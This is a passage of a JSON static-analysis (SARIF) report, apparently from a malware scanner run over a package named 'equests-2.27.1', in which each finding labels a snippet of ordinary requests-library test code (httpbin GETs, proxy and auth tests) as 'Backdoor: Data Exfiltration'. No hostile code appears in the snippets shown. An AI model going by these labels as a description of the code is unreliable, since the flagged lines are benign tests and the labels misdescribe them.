                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 24,
                  "endLine": 643,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype, 'never')\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n",
                    "rendered": {
                      "text": "            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype, 'never')\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n",
                      "markdown": "`            auth = HTTPDigestAuth('user', 'pass')\n            url = httpbin('digest-auth', 'auth', 'user', 'pass', authtype, 'never')\n\n            r = requests.get(url, auth=auth)\n            assert r.status_code == 200\n\n            r = requests.get(url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 632,
                  "startColumn": 17,
                  "endLine": 632,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n            # Given auth should override and fail.\n            s.auth = wrong_auth\n            r = s.get(url)\n            assert r.status_code == 401\n        finally:\n            requests.sessions.get_netrc_auth = old_auth\n",
                    "rendered": {
                      "text": "\n            # Given auth should override and fail.\n            s.auth = wrong_auth\n            r = s.get(url)\n            assert r.status_code == 401\n        finally:\n            requests.sessions.get_netrc_auth = old_auth\n",
                      "markdown": "`\n            # Given auth should override and fail.\n            s.auth = wrong_auth\n            r = s.get(url)\n            assert r.status_code == 401\n        finally:\n            requests.sessions.get_netrc_auth = old_auth\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 627,
                  "startColumn": 17,
                  "endLine": 627,
                  "endColumn": 22,
                  "snippet": {
                    "text": "            s = requests.session()\n\n            # Should use netrc and work.\n            r = s.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n",
                    "rendered": {
                      "text": "            s = requests.session()\n\n            # Should use netrc and work.\n            r = s.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n",
                      "markdown": "`            s = requests.session()\n\n            # Should use netrc and work.\n            r = s.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 621,
                  "startColumn": 24,
                  "endLine": 621,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            assert r.status_code == 200\n\n            # Given auth should override and fail.\n            r = requests.get(url, auth=wrong_auth)\n            assert r.status_code == 401\n\n            s = requests.session()\n",
                    "rendered": {
                      "text": "            assert r.status_code == 200\n\n            # Given auth should override and fail.\n            r = requests.get(url, auth=wrong_auth)\n            assert r.status_code == 401\n\n            s = requests.session()\n",
                      "markdown": "`            assert r.status_code == 200\n\n            # Given auth should override and fail.\n            r = requests.get(url, auth=wrong_auth)\n            assert r.status_code == 401\n\n            s = requests.session()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 617,
                  "startColumn": 24,
                  "endLine": 617,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            requests.sessions.get_netrc_auth = get_netrc_auth_mock\n\n            # Should use netrc and work.\n            r = requests.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n",
                    "rendered": {
                      "text": "            requests.sessions.get_netrc_auth = get_netrc_auth_mock\n\n            # Should use netrc and work.\n            r = requests.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n",
                      "markdown": "`            requests.sessions.get_netrc_auth = get_netrc_auth_mock\n\n            # Should use netrc and work.\n            r = requests.get(url)\n            assert r.status_code == 200\n\n            # Given auth should override and fail.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 602,
                  "startColumn": 27,
                  "endLine": 602,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n    def test_basicauth_with_netrc(self, httpbin):\n        auth = ('user', 'pass')\n",
                    "rendered": {
                      "text": "        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n    def test_basicauth_with_netrc(self, httpbin):\n        auth = ('user', 'pass')\n",
                      "markdown": "`        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n    def test_basicauth_with_netrc(self, httpbin):\n        auth = ('user', 'pass')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 600,
                  "startColumn": 34,
                  "endLine": 600,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n",
                    "rendered": {
                      "text": "        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n",
                      "markdown": "`        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 599,
                  "startColumn": 22,
                  "endLine": 599,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        proxy_auth_value = \"Bearer XXX\"\n        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n",
                    "rendered": {
                      "text": "        proxy_auth_value = \"Bearer XXX\"\n        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n",
                      "markdown": "`        proxy_auth_value = \"Bearer XXX\"\n        session = requests.Session()\n        session.headers.update({\"Proxy-Authorization\": proxy_auth_value})\n        resp = session.request(method='GET', url=httpbin('get'))\n        sent_headers = resp.json().get('headers', {})\n\n        assert sent_headers.get(\"Proxy-Authorization\") == proxy_auth_value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 593,
                  "startColumn": 23,
                  "endLine": 593,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.request(method='GET', url=httpbin())\n\n    def test_proxy_authorization_preserved_on_request(self, httpbin):\n        proxy_auth_value = \"Bearer XXX\"\n",
                    "rendered": {
                      "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.request(method='GET', url=httpbin())\n\n    def test_proxy_authorization_preserved_on_request(self, httpbin):\n        proxy_auth_value = \"Bearer XXX\"\n",
                      "markdown": "`        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.request(method='GET', url=httpbin())\n\n    def test_proxy_authorization_preserved_on_request(self, httpbin):\n        proxy_auth_value = \"Bearer XXX\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 587,
                  "startColumn": 23,
                  "endLine": 587,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.get(httpbin())\n\n    def test_respect_proxy_env_on_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n",
                    "rendered": {
                      "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.get(httpbin())\n\n    def test_respect_proxy_env_on_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n",
                      "markdown": "`        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                session.get(httpbin())\n\n    def test_respect_proxy_env_on_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 580,
                  "startColumn": 34,
                  "endLine": 580,
                  "endColumn": 43,
                  "snippet": {
                    "text": "                session = requests.Session()\n                url = httpbin('redirect/1')\n                print(url)\n                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n",
                    "rendered": {
                      "text": "                session = requests.Session()\n                url = httpbin('redirect/1')\n                print(url)\n                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n",
                      "markdown": "`                session = requests.Session()\n                url = httpbin('redirect/1')\n                print(url)\n                request = requests.Request('GET', url)\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_get(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 570,
                  "startColumn": 34,
                  "endLine": 570,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                prepared = session.prepare_request(request)\n                session.send(prepared)\n\n",
                    "rendered": {
                      "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                prepared = session.prepare_request(request)\n                session.send(prepared)\n\n",
                      "markdown": "`        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                prepared = session.prepare_request(request)\n                session.send(prepared)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 563,
                  "startColumn": 34,
                  "endLine": 563,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_send_session_prepared_request(self, httpbin):\n",
                    "rendered": {
                      "text": "        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_send_session_prepared_request(self, httpbin):\n",
                      "markdown": "`        with override_environ(http_proxy=INVALID_PROXY):\n            with pytest.raises(ProxyError):\n                session = requests.Session()\n                request = requests.Request('GET', httpbin())\n                session.send(request.prepare())\n\n    def test_respect_proxy_env_on_send_session_prepared_request(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 557,
                  "startColumn": 20,
                  "endLine": 557,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n\n    def test_respect_proxy_env_on_send_self_prepared_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n",
                    "rendered": {
                      "text": "            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n\n    def test_respect_proxy_env_on_send_self_prepared_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n",
                      "markdown": "`            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n\n    def test_respect_proxy_env_on_send_self_prepared_request(self, httpbin):\n        with override_environ(http_proxy=INVALID_PROXY):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 554,
                  "startColumn": 20,
                  "endLine": 554,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n",
                    "rendered": {
                      "text": "            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n",
                      "markdown": "`            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http:///example.com:8080'})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 551,
                  "startColumn": 20,
                  "endLine": 551,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n",
                    "rendered": {
                      "text": "            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n",
                      "markdown": "`            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'https://'})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 548,
                  "startColumn": 20,
                  "endLine": 548,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n",
                    "rendered": {
                      "text": "\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n",
                      "markdown": "`\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin_secure(), proxies={'https': 'http:/badproxyurl:3128'})\n\n        with pytest.raises(InvalidProxyURL):\n            requests.get(httpbin(), proxies={'http': 'http://:8080'})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 544,
                  "startColumn": 20,
                  "endLine": 544,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n        with pytest.raises(ProxyError):\n            requests.get('http://localhost:1', proxies={'http': 'non-resolvable-address'})\n\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n",
                    "rendered": {
                      "text": "    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n        with pytest.raises(ProxyError):\n            requests.get('http://localhost:1', proxies={'http': 'non-resolvable-address'})\n\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n",
                      "markdown": "`    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n        with pytest.raises(ProxyError):\n            requests.get('http://localhost:1', proxies={'http': 'non-resolvable-address'})\n\n    def test_proxy_error_on_bad_url(self, httpbin, httpbin_secure):\n        with pytest.raises(InvalidProxyURL):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 539,
                  "startColumn": 20,
                  "endLine": 539,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        ))\n    def test_errors(self, url, exception):\n        with pytest.raises(exception):\n            requests.get(url, timeout=1)\n\n    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n",
                    "rendered": {
                      "text": "        ))\n    def test_errors(self, url, exception):\n        with pytest.raises(exception):\n            requests.get(url, timeout=1)\n\n    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n",
                      "markdown": "`        ))\n    def test_errors(self, url, exception):\n        with pytest.raises(exception):\n            requests.get(url, timeout=1)\n\n    def test_proxy_error(self):\n        # any proxy related error (address resolution, no route to host, etc) should result in a ProxyError\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 523,
                  "startColumn": 20,
                  "endLine": 523,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        than the unicode string \"b'test'\" in Python 3.\n        \"\"\"\n        auth = (b'\\xc5\\xafsername', b'test\\xc6\\xb6')\n        r = requests.Request('GET', 'http://localhost', auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == 'Basic xa9zZXJuYW1lOnRlc3TGtg=='\n",
                    "rendered": {
                      "text": "        than the unicode string \"b'test'\" in Python 3.\n        \"\"\"\n        auth = (b'\\xc5\\xafsername', b'test\\xc6\\xb6')\n        r = requests.Request('GET', 'http://localhost', auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == 'Basic xa9zZXJuYW1lOnRlc3TGtg=='\n",
                      "markdown": "`        than the unicode string \"b'test'\" in Python 3.\n        \"\"\"\n        auth = (b'\\xc5\\xafsername', b'test\\xc6\\xb6')\n        r = requests.Request('GET', 'http://localhost', auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == 'Basic xa9zZXJuYW1lOnRlc3TGtg=='\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 513,
                  "startColumn": 20,
                  "endLine": 513,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n",
                    "rendered": {
                      "text": "        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n",
                      "markdown": "`        auth = (username, password)\n        url = httpbin('get')\n\n        r = requests.Request('GET', url, auth=auth)\n        p = r.prepare()\n\n        assert p.headers['Authorization'] == _basic_auth_str(username, password)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 499,
                  "startColumn": 13,
                  "endLine": 499,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n        s = requests.session()\n        s.auth = auth\n        r = s.get(url)\n        assert r.status_code == 200\n\n    @pytest.mark.parametrize(\n",
                    "rendered": {
